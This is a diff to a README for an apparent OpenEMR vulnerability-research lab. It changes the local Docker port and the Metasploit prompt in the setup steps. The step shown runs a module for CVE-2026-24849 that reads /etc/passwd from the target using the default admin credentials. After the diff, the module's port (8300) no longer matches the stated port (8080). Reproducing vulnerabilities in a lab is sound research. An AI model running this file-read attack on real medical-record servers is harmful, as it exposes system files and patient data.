@@ -85,7 +85,7 @@ Disclosure-Aware Extraction and Analyst-in-the-Loop Review for OpenEMR"**
     cd docker/
     docker-compose up -d
 
-This starts OpenEMR 7.0.2 on http://localhost:8300.
+This starts OpenEMR 7.0.2 on http://localhost:8080.
 Default credentials: admin / pass.
 Wait ~30 seconds before running any modules.
 
@@ -102,14 +102,14 @@ Wait ~30 seconds before running any modules.
 ## Step 3 - Run CVE-2026-24849 Module (File Read)
 
     msfconsole -q
-    msf6 > reload_all
-    msf6 > use auxiliary/gather/cve_2026_24849_faxsms_file_read
-    msf6 > set RHOSTS 127.0.0.1
-    msf6 > set RPORT 8300
-    msf6 > set USERNAME admin
-    msf6 > set PASSWORD pass
-    msf6 > set TARGETFILE /etc/passwd
-    msf6 > run
+    msf > reload_all
+    msf > use auxiliary/gather/cve_2026_24849_faxsms_file_read
+    msf > set RHOSTS 127.0.0.1
+    msf > set RPORT 8300
+    msf > set USERNAME admin
+    msf > set PASSWORD pass
+    msf > set TARGETFILE /etc/passwd
+    msf > run
 
 Expected: contents of /etc/passwd returned in module output.
 
